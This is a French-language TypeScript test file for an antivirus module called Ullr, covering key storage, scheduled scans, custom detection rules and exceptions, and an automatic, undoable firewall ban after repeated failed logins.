    assert.match(r.text, /Clé abuse\.ch et VirusTotal rangée avec les secrets d'Odin/); assert.match(r.text, /✗ MalwareBazaar : mb-api\.abuse\.ch a répondu 401 \(clé refusée ou accès non autorisé\)/, 'les trois sources sont essayées tout de suite, et un refus est dit clairement');
    const page = JSON.stringify(await ullr.view!(w.v.ctx('ullr'), new URLSearchParams())) + r.text + (await act(w, 'cles')).text + (await act(w, 'sources')).text + JSON.stringify(w.v.ctx('ullr').settings);
    assert.ok(!/CleSecreteDeTest|AutreCleSecrete/.test(page), 'aucune clé dans la page, les réponses ou les réglages de l\'appli');
    assert.match(page, /abuse\.ch : présente · VirusTotal : présente/);
  } finally { ullrKeys(undefined); w.end(); }
});

test('Ullr · plans d\'analyse, règle Galdr ajoutée, arrêt d\'une analyse, page de l\'appli', async () => {
  const w = world();
  try {
    const d = join(w.home, 'docs'); mkdirSync(d); writeFileSync(join(d, 'a.sh'), '#!/bin/sh\necho MOT-INTERDIT-ESSAI\n');
    assert.match((await act(w, 'plan', { nom: 'Documents', dossier: d, quand: 'semaine', heure: '02:30', exclusions: `${d}/tmp` })).text, /« Documents » : .* chaque semaine à 02:30, 1 dossier\(s\) exclu\(s\)/);
    assert.match((await act(w, 'plan', { nom: 'Absent', dossier: '/nulle/part' })).text, /cible introuvable/);
    assert.match((await act(w, 'plans')).text, /Documents : .* chaque semaine à 02:30 · dernière : jamais/);
    assert.match((await act(w, 'regle', { nom: 'Mot interdit', chaines: 'MOT-INTERDIT-ESSAI', gravite: 'haute' })).text, /Règle « Mot interdit » ajoutée/);
    assert.match((await act(w, 'regle', { nom: 'Cassée', chaines: '/(/' })).text, /Invalid regular expression|expression/i);
    assert.match((await act(w, 'fichier', { chemin: join(d, 'a.sh') })).text, /⚠ Mot interdit \(règle\)/);
    await act(w, 'exception', { quoi: 'Mot interdit' });
    assert.match((await act(w, 'fichier', { chemin: join(d, 'a.sh') })).text, /^✓/, 'une règle mise en exception ne signale plus');
    await act(w, 'retirer_exception', { quoi: 'Mot interdit' });
    assert.match((await act(w, 'fichier', { chemin: join(d, 'a.sh') })).text, /⚠ Mot interdit/);
    assert.match((await act(w, 'arreter')).text, /Aucune analyse en cours/);
    // Prochain passage : un plan créé à 15 h 57 pour 2 h 30 attend 2 h 30 (il ne part pas tout de suite).
    const at = (h: number, m: number, day = 11) => new Date(2026, 10, day, h, m, 0);
    assert.equal(nextRun({ every: 'jour', at: '02:30' }, at(15, 57)).getTime(), at(2, 30, 12).getTime());
    assert.equal(nextRun({ every: 'jour', at: '02:30' }, at(1, 0)).getTime(), at(2, 30).getTime());
    assert.equal(nextRun({ every: 'jour', at: '02:30' }, at(2, 31), at(2, 31)).getTime(), at(2, 30, 12).getTime(), 'après un passage : le lendemain à la même heure');
    assert.equal(nextRun({ every: 'semaine', at: '02:30' }, at(2, 31), at(2, 31)).getTime(), at(2, 30, 18).getTime(), 'chaque semaine : sept jours plus tard');
    assert.equal(nextRun({ every: 'heure', at: '00:00' }, at(10, 0)).getTime(), at(11, 0).getTime());
    assert.ok(nextRun({ every: 'jour', at: '02:30' }, at(9, 0, 20), at(2, 30, 11)) > at(9, 0, 20), 'un passage manqué pendant un arrêt ne se rattrape qu\'une fois');
    assert.match((await act(w, 'plans')).text, /prochaine : \d\d\/\d\d/);
    await ullr.watch!.run(w.v.ctx('ullr'));
    assert.equal((w.v.ctx('ullr').settings.reports as unknown[] | undefined)?.length ?? 0, 0, 'le plan tout juste créé attend son heure');
    // Le plan dû est lancé par la veille (toutes les minutes), une seule analyse à la fois.
    w.v.ctx('ullr').saveSettings({ plans: [{ name: 'Documents', target: d, every: 'heure', at: '00:00', exclude: [], next: new Date(Date.now() - 1000).toISOString() }], checkedAt: new Date().toISOString(), auto: false });
    await ullr.watch!.run(w.v.ctx('ullr'));
    assert.ok(await until(() => (w.v.ctx('ullr').settings.reports as unknown[] | undefined)?.length === 1), 'analyse planifiée faite');
    assert.equal((w.v.ctx('ullr').settings.reports as Array<{ plan: string; hits: number }>)[0].plan, 'Documents');
    assert.ok(Date.parse((w.v.ctx('ullr').settings.plans as Array<{ next: string }>)[0].next) > Date.now() + 3000_000, 'le passage suivant est prévu dans une heure');
    assert.ok(existsSync(join(d, 'a.sh')), 'quarantaine automatique coupée : rien n\'est déplacé');
    assert.match((await act(w, 'retirer_plan', { nom: 'Documents' })).text, /retiré/);
    // La page : indicateurs, incidents, détections, quarantaine, plans, rapports, sources, capteurs.
    const view = await ullr.view!(w.v.ctx('ullr'), new URLSearchParams());
    assert.deepEqual(view.kpis!.map((k) => k.label), ['Incidents ouverts', 'Détections', 'Quarantaine', 'Dernière analyse', 'Signatures']);
    const titles = view.sections.map((s) => s.title);
    for (const t of ['Incidents (signaux reliés entre les applis)', 'Détections', 'Quarantaine', 'Analyses planifiées', 'Rapports', 'Sources des signatures', 'Capteurs : les applis qui renseignent l\'antivirus', 'Ce qu\'il faut savoir']) assert.ok(titles.includes(t), `section « ${t} »`);
    const text = JSON.stringify(view);
    assert.match(text, /Aucun antivirus ne détecte 100 % des menaces/); assert.ok(!/cle-abuse-de-test|cle-vt-de-test/.test(text), 'aucune clé dans la page');
    assert.equal(view.sections.find((s) => s.title?.startsWith('Capteurs'))!.kind, 'table');
  } finally { w.end(); }
});

test('Ullr · relié aux autres applis : mots de passe d\'Odin refusés → incident → adresse bannie par Garmr (annulable) → note dans le Cerveau', async () => {
  const w = world();
  try {
    for (let i = 0; i < 7; i++) w.v.events.emit('event', { module: 'odin', type: 'connexion_refusee', data: { ip: '203.0.113.200' }, at: new Date().toISOString() });
    assert.ok(await until(() => w.ran.some((c) => /^nft add element inet odin garmr4 \{ 203\.0\.113\.200 timeout 86400s \}/.test(c))), 'l\'adresse est bannie 24 h au pare-feu');
    const m = w.v.manips({ module: 'garmr' })[0];
    assert.equal(m.by, 'réflexe'); assert.match(m.why ?? '', /incident « Quelqu'un essaie de deviner ton mot de passe d'Odin »/); assert.equal(m.undo?.action, 'debannir', 'le bannissement est annulable');
    const a = w.v.alerts({ module: 'ullr' }).find((x) => /Incident/.test(x.title))!;
    assert.match(a.title, /Quelqu'un essaie de deviner ton mot de passe d'Odin/); assert.match(a.detail ?? '', /Vu par : Odin/);
    assert.ok(await until(() => existsSync(join(w.home, 'cerveau')) && readdirSync(join(w.home, 'cerveau')).some((f) => /^Incident .*mot de passe/.test(f))));
    // Les mêmes essais depuis le réseau local : incident, mais jamais de bannissement (on ne s'enferme pas dehors).
    w.ran.length = 0;
    for (let i = 0; i < 9; i++) w.v.events.emit('event', { module: 'odin', type: 'connexion_refusee', data: { ip: '192.168.1.77' }, at: new Date().toISOString() });
    await wait(150); assert.ok(!w.ran.some((c) => /192\.168\.1\.77/.test(c)));
    // Sans IA : « les incidents », « analyse le fichier … », « mets à jour les signatures » sont compris par Huginn.
    assert.match((await w.v.order('les incidents de sécurité')).text, /deviner ton mot de passe/);
    assert.equal((await w.v.order('analyse le fichier /tmp/x.sh')).understood?.kind, 'action');
  } finally { w.end(); }
});
